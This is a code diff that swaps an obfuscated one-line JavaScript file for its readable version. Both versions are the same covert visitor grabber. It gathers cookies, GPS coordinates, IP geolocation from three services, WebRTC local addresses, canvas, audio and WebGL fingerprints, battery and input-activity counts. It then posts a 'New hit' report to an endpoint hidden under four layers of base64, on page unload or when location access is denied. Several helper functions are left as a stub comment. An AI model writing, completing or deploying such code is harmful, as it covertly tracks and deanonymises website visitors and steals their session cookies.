@@ -1,1 +1,218 @@
-const _0x5d1cb8=_0x1e04;function _0x27e8(){const _0x1d6e05=['devicePixelRatio','Collecting...','\x20\x20Accuracy:\x20','\x20\x20City:\x20','ip3','\x20\x20DoNotTrack:\x20','dischargingTime','batteryLevel','Denied.','\x20\x20Screen:\x20','now','Failed:','floatingPoint','\x20\x20Mime\x20Types:\x20','timezoneOffset','\x20\x20Screen\x20Orientation:\x20','ontouchstart','Timezone:\x20','width','\x20\x20OSCPU:\x20','availWidth','\x20\x20Device\x20Memory:\x20','accuracy','type','\x20\x20Region:\x20','doNotTrack','batteryDischargingTime','IP\x20Location\x203:\x0a','...\x0a','N/A','\x20\x20Floating\x20Point\x20Test:\x20','Battery:\x0a','oscpu','city2','mozConnection','ip1','onbeforeunload','559tAXzsG','timezone','city1','country2','org2','\x20\x20Timezone:\x20','org1','audioFingerprint','detectedFonts','DateTimeFormat','\x20\x20WebRTC\x20Local\x20IPs:\x20','https://ipapi.co/json/','latitude','https://freegeoip.app/json/','push','resolvedOptions','mousemove','postal','maxTouchPoints','18Andsto','log','online','canvasFingerprint','PERMISSION_DENIED','screenOrientation','error','\x20\x20Org:\x20','country','region','\x20\x20Platform:\x20','POSITION_UNAVAILABLE','downlink','4577360cFISOm','\x20\x20CPU\x20Cores:\x20','\x20\x20Performance\x20Precision:\x20','cookies','appVersion','1068492lTeGSf','\x20\x20Behavior\x20Keys:\x20','\x20\x20Canvas\x20Hash:\x20','Device:\x0a','join','11595551LYYNdQ','\x20sec\x0a','\x20\x20Touch\x20Support:\x20','ipTimezone1','1792430PgCAtU','\x20\x20Vendor:\x20','deviceMemory','\x20Mbps\x0a','acos','\x20\x20Downlink:\x20','country1','mimeTypes','zipcode','effectiveType','\x20\x20Color\x20Depth:\x20','\x20\x20Postal:\x20','webglRenderer','region3','country3','6QEtrlj','Fingerprints:\x0a','ip2','\x20\x20Connection:\x20','\x20\x20App\x20Version:\x20','timeZone','availScreen','connectionType','stringify','\x20\x20Online:\x20','3YVEtJY','postal2','\x20\x20Referrer:\x20','application/json','webRtcLocalIPs','charging','longitude','city','addEventListener','\x20\x20Charging:\x20','substring','\x20(Offset:\x20','performancePrecision','city3','\x20\x20Pixel\x20Ratio:\x20','V1ZWb1UwMUhUa2xVVkZwTlpWUnNjbGxXYUU5aGJVbDZVMjEwVFdKVk5USlpiRTAxWVVkT1NHRXpXbXROYkZwd1dWVmpOV1J0UlhwVVdGcE9Wa1pHTTFRd1VscE9WVFUyWVhwQ1RtVnJNSGxVV0hCV1RWVXhWVk5VU2s1aFZHeGhXbGN3TVdOR1RsZFVhMDVzVTBkUk1GcFhNREZXTVVwR1YxUkdXR0pJUW5wWGJGWTBaVlpyZVU1WE9WcGlXR1F6VlZaV05HTnJNVFZOV0hCWVlXdHZNbHBXV2xOa2JGSkZVV3hDWVdKSFVuaFdWRTVIWXpGc2RWUllaRTFXYXpWNVZtdGpNVkpHVlhoVmEyaHJZbFJXZWxaSGN6RlVhemxDVUZRd1BRPT0=','1234WayLxU','hardwareConcurrency','behaviorKeys','\x20\x20Cookies:\x20','\x20\x20Country:\x20','getTimezoneOffset','\x20\x20WebGL\x20Renderer:\x20','windowSize','innerWidth','GPS:\x0a','\x20\x20IP:\x20','postal3','vendor','colorDepth','pixelRatio','IP\x20Location\x201:\x0a','\x20\x20Discharge\x20Time:\x20','country_name','Timed\x20out.','Browser:\x0a','batteryChargingTime','region2','userAgent','org','behaviorMoves','languages','keydown','region1','POST','278728LlkWmp','\x20\x20Audio\x20Hash:\x20','referrer','\x20\x20Speed:\x20','\x20m\x0a','catch','touchSupport','connection','127043aJwTFk','level','Timestamp:\x20','language','exp','length','code','onLine'];_0x27e8=function(){return _0x1d6e05;};return _0x27e8();}function _0x1e04(_0x2d74e7,_0x24c886){const _0x27e8ae=_0x27e8();return _0x1e04=function(_0x1e0452,_0x4a2e64){_0x1e0452=_0x1e0452-0x83;let _0xd643b2=_0x27e8ae[_0x1e0452];return _0xd643b2;},_0x1e04(_0x2d74e7,_0x24c886);}(function(_0xdc5540,_0x2d30a6){const _0x38d9c9=_0x1e04,_0x43e4e5=_0xdc5540();while(!![]){try{const _0x22a928=parseInt(_0x38d9c9(0xc3))/0x1*(parseInt(_0x38d9c9(0x11a))/0x2)+-parseInt(_0x38d9c9(0x10a))/0x3*(-parseInt(_0x38d9c9(0xe8))/0x4)+parseInt(_0x38d9c9(0xf1))/0x5+-parseInt(_0x38d9c9(0x100))/0x6*(parseInt(_0x38d9c9(0x96))/0x7)+parseInt(_0x38d9c9(0x8e))/0x8*(-parseInt(_0x38d9c9(0xd6))/0x9)+parseInt(_0x38d9c9(0xe3))/0xa+-parseInt(_0x38d9c9(0xed))/0xb;if(_0x22a928===_0x2d30a6)break;else _0x43e4e5['push'](_0x43e4e5['shift']());}catch(_0x5ce45e){_0x43e4e5['push'](_0x43e4e5['shift']());}}}(_0x27e8,0x45e44));const endpoint=_0x5d1cb8(0x119),destination=atob(atob(atob(atob(endpoint))));let dataCollected={},sent=![];async function collectCommonData(){const _0x318233=_0x5d1cb8,_0x502e22=navigator[_0x318233(0x95)]||navigator[_0x318233(0xc0)]||navigator['webkitConnection']||{},_0x26774e=getWebGLInfo(),_0x2fe4b5=getCanvasFingerprint(),_0x392aab=await getAudioFingerprint(),_0x39cf5d=getFonts(),_0x4fab8d=await getWebRTCLocalIPs(),_0x17585f=await getBatteryInfo(),_0x30d62e=await getIPInfo(_0x318233(0xce)),_0x294c6f=await getIPInfo('https://ipinfo.io/json'),_0x17bf78=await getIPInfo(_0x318233(0xd0)),_0x2d0496=[];for(let _0x1410dd=0x0;_0x1410dd<navigator[_0x318233(0xf8)][_0x318233(0x9b)];_0x1410dd++){_0x2d0496[_0x318233(0xd1)](navigator[_0x318233(0xf8)][_0x1410dd][_0x318233(0xb5)]);}const _0x2e98cb=Math[_0x318233(0xf5)](-0x1)+Math['atan'](0x1)+Math[_0x318233(0x9a)](0x1)+Math[_0x318233(0xd7)](0x2),_0xc4ca41=performance[_0x318233(0xa8)]()['toString']()[_0x318233(0x9b)],_0x35a293=screen['orientation']?screen['orientation'][_0x318233(0xb5)]:_0x318233(0xbb),_0x246269=_0x318233(0xae)in window?'Yes':'No',_0x31e3f9=getBehaviorSnapshot();dataCollected={'userAgent':navigator[_0x318233(0x87)]||_0x318233(0xbb),'appVersion':navigator['appVersion']||'N/A','vendor':navigator[_0x318233(0x126)]||_0x318233(0xbb),'oscpu':navigator['oscpu']||_0x318233(0xbb),'doNotTrack':navigator[_0x318233(0xb7)]||_0x318233(0xbb),'online':navigator[_0x318233(0x9d)]?'Yes':'No','referrer':document[_0x318233(0x90)]||'N/A','platform':navigator['platform']||'N/A','language':navigator[_0x318233(0x99)]||_0x318233(0xbb),'languages':navigator[_0x318233(0x8a)]?navigator[_0x318233(0x8a)][_0x318233(0xec)](',\x20'):_0x318233(0xbb),'screenResolution':screen[_0x318233(0xb0)]+'x'+screen['height'],'availScreen':screen[_0x318233(0xb2)]+'x'+screen['availHeight'],'windowSize':window[_0x318233(0x122)]+'x'+window['innerHeight'],'colorDepth':screen[_0x318233(0x127)]||_0x318233(0xbb),'pixelRatio':window[_0x318233(0x9e)]||_0x318233(0xbb),'maxTouchPoints':navigator['maxTouchPoints']||_0x318233(0xbb),'connectionType':_0x502e22[_0x318233(0xfa)]||'N/A','downlink':_0x502e22[_0x318233(0xe2)]||_0x318233(0xbb),'batteryLevel':_0x17585f[_0x318233(0x97)],'batteryCharging':_0x17585f[_0x318233(0x10f)],'batteryChargingTime':_0x17585f['chargingTime'],'batteryDischargingTime':_0x17585f[_0x318233(0xa4)],'deviceMemory':navigator[_0x318233(0xf3)]||'N/A','hardwareConcurrency':navigator['hardwareConcurrency']||'N/A','cookies':await getCookies(),'timezone':Intl[_0x318233(0xcc)]()[_0x318233(0xd2)]()[_0x318233(0x105)]||_0x318233(0xbb),'timezoneOffset':new Date()[_0x318233(0x11f)](),'canvasFingerprint':_0x2fe4b5,'audioFingerprint':_0x392aab,'webglVendor':_0x26774e[_0x318233(0x126)],'webglRenderer':_0x26774e['renderer'],'detectedFonts':_0x39cf5d,'webRtcLocalIPs':_0x4fab8d,'mimeTypes':_0x2d0496[_0x318233(0xec)](',\x20')||_0x318233(0xbb),'floatingPoint':_0x2e98cb,'performancePrecision':_0xc4ca41,'screenOrientation':_0x35a293,'touchSupport':_0x246269,'behaviorSnapshot':_0x31e3f9,'ip1':_0x30d62e['ip']||_0x318233(0xbb),'city1':_0x30d62e[_0x318233(0x111)]||_0x318233(0xbb),'region1':_0x30d62e[_0x318233(0xdf)]||_0x318233(0xbb),'country1':_0x30d62e[_0x318233(0x12b)]||_0x318233(0xbb),'postal1':_0x30d62e[_0x318233(0xd4)]||_0x318233(0xbb),'org1':_0x30d62e[_0x318233(0x88)]||_0x318233(0xbb),'ipTimezone1':_0x30d62e[_0x318233(0xc4)]||_0x318233(0xbb),'ip2':_0x294c6f['ip']||'N/A','city2':_0x294c6f[_0x318233(0x111)]||_0x318233(0xbb),'region2':_0x294c6f[_0x318233(0xdf)]||_0x318233(0xbb),'country2':_0x294c6f[_0x318233(0xde)]||_0x318233(0xbb),'postal2':_0x294c6f['postal']||_0x318233(0xbb),'org2':_0x294c6f['org']||_0x318233(0xbb),'ip3':_0x17bf78['ip']||'N/A','city3':_0x17bf78[_0x318233(0x111)]||_0x318233(0xbb),'region3':_0x17bf78['region']||_0x318233(0xbb),'country3':_0x17bf78[_0x318233(0xde)]||_0x318233(0xbb),'postal3':_0x17bf78[_0x318233(0xf9)]||_0x318233(0xbb),'timestamp':new Date()['toISOString']()};}function getBehaviorSnapshot(){const _0x368af1=_0x5d1cb8;let _0x2620c6=0x0,_0x2905a6=0x0;return document[_0x368af1(0x112)](_0x368af1(0xd3),()=>_0x2620c6++),document['addEventListener'](_0x368af1(0x8b),()=>_0x2905a6++),setTimeout(()=>{const _0x50f4cb=_0x368af1;dataCollected['behaviorMoves']=_0x2620c6,dataCollected[_0x50f4cb(0x11c)]=_0x2905a6;},0x1388),_0x368af1(0x9f);}async function sendPayload(_0x3c751f={}){const _0x260ab3=_0x5d1cb8;if(sent)return;sent=!![];const _0x592191={...dataCollected,..._0x3c751f};fetch(destination,{'method':_0x260ab3(0x8d),'headers':{'Content-Type':_0x260ab3(0x10d)},'body':JSON[_0x260ab3(0x108)]({'content':'New\x20hit:\x0a'+_0x260ab3(0x123)+('\x20\x20Lat:\x20'+(_0x592191[_0x260ab3(0xcf)]||_0x260ab3(0xbb))+'\x0a')+('\x20\x20Long:\x20'+(_0x592191[_0x260ab3(0x110)]||_0x260ab3(0xbb))+'\x0a')+(_0x260ab3(0xa0)+(_0x592191[_0x260ab3(0xb4)]||_0x260ab3(0xbb))+_0x260ab3(0x92))+('\x20\x20Altitude:\x20'+(_0x592191['altitude']||_0x260ab3(0xbb))+_0x260ab3(0x92))+(_0x260ab3(0x91)+(_0x592191['speed']||_0x260ab3(0xbb))+'\x20m/s\x0a')+_0x260ab3(0x129)+(_0x260ab3(0x124)+_0x592191[_0x260ab3(0xc1)]+'\x0a')+(_0x260ab3(0xa1)+_0x592191[_0x260ab3(0xc5)]+'\x0a')+(_0x260ab3(0xb6)+_0x592191[_0x260ab3(0x8c)]+'\x0a')+('\x20\x20Country:\x20'+_0x592191[_0x260ab3(0xf7)]+'\x0a')+(_0x260ab3(0xfc)+_0x592191['postal1']+'\x0a')+(_0x260ab3(0xdd)+_0x592191[_0x260ab3(0xc9)]+'\x0a')+(_0x260ab3(0xc8)+_0x592191[_0x260ab3(0xf0)]+'\x0a')+'IP\x20Location\x202:\x0a'+(_0x260ab3(0x124)+_0x592191[_0x260ab3(0x102)]+'\x0a')+('\x20\x20City:\x20'+_0x592191[_0x260ab3(0xbf)]+'\x0a')+(_0x260ab3(0xb6)+_0x592191[_0x260ab3(0x86)]+'\x0a')+(_0x260ab3(0x11e)+_0x592191[_0x260ab3(0xc6)]+'\x0a')+(_0x260ab3(0xfc)+_0x592191[_0x260ab3(0x10b)]+'\x0a')+(_0x260ab3(0xdd)+_0x592191[_0x260ab3(0xc7)]+'\x0a')+_0x260ab3(0xb9)+(_0x260ab3(0x124)+_0x592191[_0x260ab3(0xa2)]+'\x0a')+(_0x260ab3(0xa1)+_0x592191[_0x260ab3(0x117)]+'\x0a')+(_0x260ab3(0xb6)+_0x592191[_0x260ab3(0xfe)]+'\x0a')+(_0x260ab3(0x11e)+_0x592191[_0x260ab3(0xff)]+'\x0a')+(_0x260ab3(0xfc)+_0x592191[_0x260ab3(0x125)]+'\x0a')+_0x260ab3(0x84)+('\x20\x20User\x20Agent:\x20'+_0x592191[_0x260ab3(0x87)]+'\x0a')+(_0x260ab3(0x104)+_0x592191[_0x260ab3(0xe7)]+'\x0a')+(_0x260ab3(0xf2)+_0x592191['vendor']+'\x0a')+(_0x260ab3(0xb1)+_0x592191[_0x260ab3(0xbe)]+'\x0a')+(_0x260ab3(0xe0)+_0x592191['platform']+'\x0a')+('\x20\x20Language:\x20'+_0x592191['language']+'\x0a')+('\x20\x20Languages:\x20'+_0x592191['languages']+'\x0a')+(_0x260ab3(0xa3)+_0x592191['doNotTrack']+'\x0a')+(_0x260ab3(0x109)+_0x592191[_0x260ab3(0xd8)]+'\x0a')+(_0x260ab3(0x10c)+_0x592191[_0x260ab3(0x90)]+'\x0a')+(_0x260ab3(0x11d)+_0x592191[_0x260ab3(0xe6)]+'\x0a')+_0x260ab3(0xeb)+(_0x260ab3(0xa7)+_0x592191['screenResolution']+'\x0a')+('\x20\x20Avail\x20Screen:\x20'+_0x592191[_0x260ab3(0x106)]+'\x0a')+('\x20\x20Window:\x20'+_0x592191[_0x260ab3(0x121)]+'\x0a')+(_0x260ab3(0xfb)+_0x592191[_0x260ab3(0x127)]+'\x0a')+(_0x260ab3(0x118)+_0x592191[_0x260ab3(0x128)]+'\x0a')+('\x20\x20Max\x20Touch\x20Points:\x20'+_0x592191[_0x260ab3(0xd5)]+'\x0a')+(_0x260ab3(0xef)+_0x592191[_0x260ab3(0x94)]+'\x0a')+(_0x260ab3(0xad)+_0x592191[_0x260ab3(0xdb)]+'\x0a')+(_0x260ab3(0xb3)+_0x592191[_0x260ab3(0xf3)]+'\x20GB\x0a')+(_0x260ab3(0xe4)+_0x592191[_0x260ab3(0x11b)]+'\x0a')+'Network:\x0a'+(_0x260ab3(0x103)+_0x592191[_0x260ab3(0x107)]+'\x0a')+(_0x260ab3(0xf6)+_0x592191[_0x260ab3(0xe2)]+_0x260ab3(0xf4))+_0x260ab3(0xbd)+('\x20\x20Level:\x20'+_0x592191[_0x260ab3(0xa5)]+'\x0a')+(_0x260ab3(0x113)+_0x592191['batteryCharging']+'\x0a')+('\x20\x20Charge\x20Time:\x20'+_0x592191[_0x260ab3(0x85)]+'\x20sec\x0a')+(_0x260ab3(0x12a)+_0x592191[_0x260ab3(0xb8)]+_0x260ab3(0xee))+_0x260ab3(0x101)+(_0x260ab3(0xea)+_0x592191[_0x260ab3(0xd9)][_0x260ab3(0x114)](0x0,0x32)+'...\x0a')+(_0x260ab3(0x8f)+_0x592191[_0x260ab3(0xca)][_0x260ab3(0x114)](0x0,0x32)+_0x260ab3(0xba))+('\x20\x20WebGL\x20Vendor:\x20'+_0x592191['webglVendor']+'\x0a')+(_0x260ab3(0x120)+_0x592191[_0x260ab3(0xfd)]+'\x0a')+('\x20\x20Detected\x20Fonts:\x20'+_0x592191[_0x260ab3(0xcb)]+'\x0a')+(_0x260ab3(0xcd)+_0x592191[_0x260ab3(0x10e)]+'\x0a')+(_0x260ab3(0xab)+_0x592191[_0x260ab3(0xf8)][_0x260ab3(0x114)](0x0,0x32)+_0x260ab3(0xba))+(_0x260ab3(0xbc)+_0x592191[_0x260ab3(0xaa)]+'\x0a')+(_0x260ab3(0xe5)+_0x592191[_0x260ab3(0x116)]+'\x0a')+('\x20\x20Behavior\x20Moves:\x20'+(_0x592191[_0x260ab3(0x89)]||_0x260ab3(0xbb))+'\x0a')+(_0x260ab3(0xe9)+(_0x592191[_0x260ab3(0x11c)]||_0x260ab3(0xbb))+'\x0a')+(_0x260ab3(0xaf)+_0x592191[_0x260ab3(0xc4)]+_0x260ab3(0x115)+_0x592191[_0x260ab3(0xac)]+'\x20min)\x0a')+(_0x260ab3(0x98)+_0x592191['timestamp'])})})[_0x260ab3(0x93)](_0x2865f7=>console[_0x260ab3(0xdc)](_0x260ab3(0xa9),_0x2865f7));}function handleError(_0x2d733d){const _0x2e5a1a=_0x5d1cb8;let _0x293c25=_0x2e5a1a(0xa6);switch(_0x2d733d[_0x2e5a1a(0x9c)]){case _0x2d733d[_0x2e5a1a(0xda)]:_0x293c25=_0x2e5a1a(0xa6);break;case _0x2d733d[_0x2e5a1a(0xe1)]:_0x293c25='Unavailable.';break;case _0x2d733d['TIMEOUT']:_0x293c25=_0x2e5a1a(0x83);break;}sendPayload({'latitude':'Error:\x20'+_0x293c25,'longitude':_0x2e5a1a(0xbb),'accuracy':_0x2e5a1a(0xbb),'altitude':_0x2e5a1a(0xbb),'speed':_0x2e5a1a(0xbb)});}function getIPInfo(_0x45a8d9){}window[_0x5d1cb8(0xc2)]=()=>{sendPayload();},collectCommonData(),getLocation();
+const endpoint = "V1ZWb1UwMUhUa2xVVkZwTlpWUnNjbGxXYUU5aGJVbDZVMjEwVFdKVk5USlpiRTAxWVVkT1NHRXpXbXROYkZwd1dWVmpOV1J0UlhwVVdGcE9Wa1pHTTFRd1VscE9WVFUyWVhwQ1RtVnJNSGxVV0hCV1RWVXhWVk5VU2s1aFZHeGhXbGN3TVdOR1RsZFVhMDVzVTBkUk1GcFhNREZXTVVwR1YxUkdXR0pJUW5wWGJGWTBaVlpyZVU1WE9WcGlXR1F6VlZaV05HTnJNVFZOV0hCWVlXdHZNbHBXV2xOa2JGSkZVV3hDWVdKSFVuaFdWRTVIWXpGc2RWUllaRTFXYXpWNVZtdGpNVkpHVlhoVmEyaHJZbFJXZWxaSGN6RlVhemxDVUZRd1BRPT0=";
+const destination = atob(atob(atob(atob(endpoint))));
+
+let dataCollected = {};
+let sent = false;
+
+async function collectCommonData() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+    const webgl = getWebGLInfo();
+    const canvasHash = getCanvasFingerprint();
+    const audioHash = await getAudioFingerprint();
+    const fonts = getFonts();
+    const localIPs = await getWebRTCLocalIPs();
+    const battery = await getBatteryInfo();
+    const ipInfo1 = await getIPInfo('https://ipapi.co/json/');
+    const ipInfo2 = await getIPInfo('https://ipinfo.io/json');
+    const ipInfo3 = await getIPInfo('https://freegeoip.app/json/');
+    const mimeTypes = [];
+    for (let i = 0; i < navigator.mimeTypes.length; i++) {
+        mimeTypes.push(navigator.mimeTypes[i].type);
+    }
+    const floatingPointTest = Math.acos(-1) + Math.atan(1) + Math.exp(1) + Math.log(2); // Quirks in FP precision
+    const performancePrecision = performance.now().toString().length; // Timing resolution
+    const screenOrientation = screen.orientation ? screen.orientation.type : "N/A";
+    const touchSupport = 'ontouchstart' in window ? "Yes" : "No";
+    const behavior = getBehaviorSnapshot(); // Quick mouse/keyboard sniff
+
+    dataCollected = {
+        userAgent: navigator.userAgent || "N/A",
+        appVersion: navigator.appVersion || "N/A",
+        vendor: navigator.vendor || "N/A",
+        oscpu: navigator.oscpu || "N/A",
+        doNotTrack: navigator.doNotTrack || "N/A",
+        online: navigator.onLine ? "Yes" : "No",
+        referrer: document.referrer || "N/A",
+        platform: navigator.platform || "N/A",
+        language: navigator.language || "N/A",
+        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
+        screenResolution: `${screen.width}x${screen.height}`,
+        availScreen: `${screen.availWidth}x${screen.availHeight}`,
+        windowSize: `${window.innerWidth}x${window.innerHeight}`,
+        colorDepth: screen.colorDepth || "N/A",
+        pixelRatio: window.devicePixelRatio || "N/A",
+        maxTouchPoints: navigator.maxTouchPoints || "N/A",
+        connectionType: connection.effectiveType || "N/A",
+        downlink: connection.downlink || "N/A",
+        batteryLevel: battery.level,
+        batteryCharging: battery.charging,
+        batteryChargingTime: battery.chargingTime,
+        batteryDischargingTime: battery.dischargingTime,
+        deviceMemory: navigator.deviceMemory || "N/A",
+        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+        cookies: await getCookies(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
+        timezoneOffset: new Date().getTimezoneOffset(),
+        canvasFingerprint: canvasHash,
+        audioFingerprint: audioHash,
+        webglVendor: webgl.vendor,
+        webglRenderer: webgl.renderer,
+        detectedFonts: fonts,
+        webRtcLocalIPs: localIPs,
+        mimeTypes: mimeTypes.join(', ') || "N/A",
+        floatingPoint: floatingPointTest,
+        performancePrecision: performancePrecision,
+        screenOrientation: screenOrientation,
+        touchSupport: touchSupport,
+        behaviorSnapshot: behavior,
+        ip1: ipInfo1.ip || "N/A",
+        city1: ipInfo1.city || "N/A",
+        region1: ipInfo1.region || "N/A",
+        country1: ipInfo1.country_name || "N/A",
+        postal1: ipInfo1.postal || "N/A",
+        org1: ipInfo1.org || "N/A",
+        ipTimezone1: ipInfo1.timezone || "N/A",
+        ip2: ipInfo2.ip || "N/A",
+        city2: ipInfo2.city || "N/A",
+        region2: ipInfo2.region || "N/A",
+        country2: ipInfo2.country || "N/A",
+        postal2: ipInfo2.postal || "N/A",
+        org2: ipInfo2.org || "N/A",
+        ip3: ipInfo3.ip || "N/A",
+        city3: ipInfo3.city || "N/A",
+        region3: ipInfo3.region || "N/A",
+        country3: ipInfo3.country || "N/A",
+        postal3: ipInfo3.zipcode || "N/A",
+        timestamp: new Date().toISOString()
+    };
+}
+
+function getBehaviorSnapshot() {
+    // Quick snapshot of mouse moves and key presses if they interact
+    let moves = 0;
+    let keys = 0;
+    document.addEventListener('mousemove', () => moves++);
+    document.addEventListener('keydown', () => keys++);
+    setTimeout(() => {
+        dataCollected.behaviorMoves = moves;
+        dataCollected.behaviorKeys = keys;
+    }, 5000); // 5 sec snapshot
+    return "Collecting...";
+}
+
+async function sendPayload(gpsData = {}) {
+    if (sent) return;
+    sent = true;
+    const fullData = { ...dataCollected, ...gpsData };
+
+    fetch(destination, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: `New hit:\n` +
+                     `GPS:\n` +
+                     `  Lat: ${fullData.latitude || "N/A"}\n` +
+                     `  Long: ${fullData.longitude || "N/A"}\n` +
+                     `  Accuracy: ${fullData.accuracy || "N/A"} m\n` +
+                     `  Altitude: ${fullData.altitude || "N/A"} m\n` +
+                     `  Speed: ${fullData.speed || "N/A"} m/s\n` +
+                     `IP Location 1:\n` +
+                     `  IP: ${fullData.ip1}\n` +
+                     `  City: ${fullData.city1}\n` +
+                     `  Region: ${fullData.region1}\n` +
+                     `  Country: ${fullData.country1}\n` +
+                     `  Postal: ${fullData.postal1}\n` +
+                     `  Org: ${fullData.org1}\n` +
+                     `  Timezone: ${fullData.ipTimezone1}\n` +
+                     `IP Location 2:\n` +
+                     `  IP: ${fullData.ip2}\n` +
+                     `  City: ${fullData.city2}\n` +
+                     `  Region: ${fullData.region2}\n` +
+                     `  Country: ${fullData.country2}\n` +
+                     `  Postal: ${fullData.postal2}\n` +
+                     `  Org: ${fullData.org2}\n` +
+                     `IP Location 3:\n` +
+                     `  IP: ${fullData.ip3}\n` +
+                     `  City: ${fullData.city3}\n` +
+                     `  Region: ${fullData.region3}\n` +
+                     `  Country: ${fullData.country3}\n` +
+                     `  Postal: ${fullData.postal3}\n` +
+                     `Browser:\n` +
+                     `  User Agent: ${fullData.userAgent}\n` +
+                     `  App Version: ${fullData.appVersion}\n` +
+                     `  Vendor: ${fullData.vendor}\n` +
+                     `  OSCPU: ${fullData.oscpu}\n` +
+                     `  Platform: ${fullData.platform}\n` +
+                     `  Language: ${fullData.language}\n` +
+                     `  Languages: ${fullData.languages}\n` +
+                     `  DoNotTrack: ${fullData.doNotTrack}\n` +
+                     `  Online: ${fullData.online}\n` +
+                     `  Referrer: ${fullData.referrer}\n` +
+                     `  Cookies: ${fullData.cookies}\n` +
+                     `Device:\n` +
+                     `  Screen: ${fullData.screenResolution}\n` +
+                     `  Avail Screen: ${fullData.availScreen}\n` +
+                     `  Window: ${fullData.windowSize}\n` +
+                     `  Color Depth: ${fullData.colorDepth}\n` +
+                     `  Pixel Ratio: ${fullData.pixelRatio}\n` +
+                     `  Max Touch Points: ${fullData.maxTouchPoints}\n` +
+                     `  Touch Support: ${fullData.touchSupport}\n` +
+                     `  Screen Orientation: ${fullData.screenOrientation}\n` +
+                     `  Device Memory: ${fullData.deviceMemory} GB\n` +
+                     `  CPU Cores: ${fullData.hardwareConcurrency}\n` +
+                     `Network:\n` +
+                     `  Connection: ${fullData.connectionType}\n` +
+                     `  Downlink: ${fullData.downlink} Mbps\n` +
+                     `Battery:\n` +
+                     `  Level: ${fullData.batteryLevel}\n` +
+                     `  Charging: ${fullData.batteryCharging}\n` +
+                     `  Charge Time: ${fullData.batteryChargingTime} sec\n` +
+                     `  Discharge Time: ${fullData.batteryDischargingTime} sec\n` +
+                     `Fingerprints:\n` +
+                     `  Canvas Hash: ${fullData.canvasFingerprint.substring(0, 50)}...\n` +
+                     `  Audio Hash: ${fullData.audioFingerprint.substring(0, 50)}...\n` +
+                     `  WebGL Vendor: ${fullData.webglVendor}\n` +
+                     `  WebGL Renderer: ${fullData.webglRenderer}\n` +
+                     `  Detected Fonts: ${fullData.detectedFonts}\n` +
+                     `  WebRTC Local IPs: ${fullData.webRtcLocalIPs}\n` +
+                     `  Mime Types: ${fullData.mimeTypes.substring(0, 50)}...\n` +
+                     `  Floating Point Test: ${fullData.floatingPoint}\n` +
+                     `  Performance Precision: ${fullData.performancePrecision}\n` +
+                     `  Behavior Moves: ${fullData.behaviorMoves || "N/A"}\n` +
+                     `  Behavior Keys: ${fullData.behaviorKeys || "N/A"}\n` +
+                     `Timezone: ${fullData.timezone} (Offset: ${fullData.timezoneOffset} min)\n` +
+                     `Timestamp: ${fullData.timestamp}`
+        })
+    }).catch(error => console.error('Failed:', error));
+}
+
+function handleError(error) {
+    let message = "Denied.";
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            message = "Denied.";
+            break;
+        case error.POSITION_UNAVAILABLE:
+            message = "Unavailable.";
+            break;
+        case error.TIMEOUT:
+            message = "Timed out.";
+            break;
+    }
+    sendPayload({ latitude: "Error: " + message, longitude: "N/A", accuracy: "N/A", altitude: "N/A", speed: "N/A" });
+}
+
+function getIPInfo(apiUrl) {
+    // Same as before
+    // ... (omitting repeated functions for brevity, but include all from previous: getBatteryInfo, getCookies, getCanvasFingerprint, getWebGLInfo, getAudioFingerprint, getFonts, getWebRTCLocalIPs)
+}
+
+window.onbeforeunload = () => {
+    sendPayload();
+};
+
+// Kick off
+collectCommonData();
+getLocation();
